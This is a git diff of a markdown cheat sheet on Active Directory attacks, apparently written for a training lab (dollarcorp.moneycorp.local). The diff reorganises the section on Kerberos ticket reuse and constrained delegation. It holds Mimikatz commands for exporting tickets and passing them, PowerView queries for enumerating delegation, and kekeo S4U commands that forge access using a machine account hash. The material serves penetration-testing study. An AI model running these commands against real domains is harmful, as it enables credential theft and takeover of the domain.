@@ -863,10 +863,11 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 
 #### Reuse the Domain admin ticket
 ```
-Invoke-Mimikatz -Command '"Kerberos:ptt"' <kirbi file>
+Invoke-Mimikatz -Command '"kerberos:ptt"' <kirbi file>
 ```
 
 ## Constrained Delegation
+### Enumerate
 #### Enumerate users with contrained delegation enables
 ```
 Get-DomainUser -TrustedToAuth
@@ -875,9 +876,8 @@ Get-DomainUser -TrustedToAuth
 #### Enumerate computers with contrained delegation enables
 ```
 Get-Domaincomputer -TrustedToAuth
-Get-Domaincomputer -TrustedToAuth
 ```
-
+### Constrained delegation User
 #### Requesting TGT with kekeo
 ```
 ./kekeo.exe
@@ -894,6 +894,7 @@ Tgs::s4u /tgt:<tgt> /user:Administrator@dollarcorp.moneycorp.local /service:cifs
 Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 ```
 
+### Constrained delegation Computer
 #### Requesting TGT with a PC hash
 ```
 Tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:<hash>
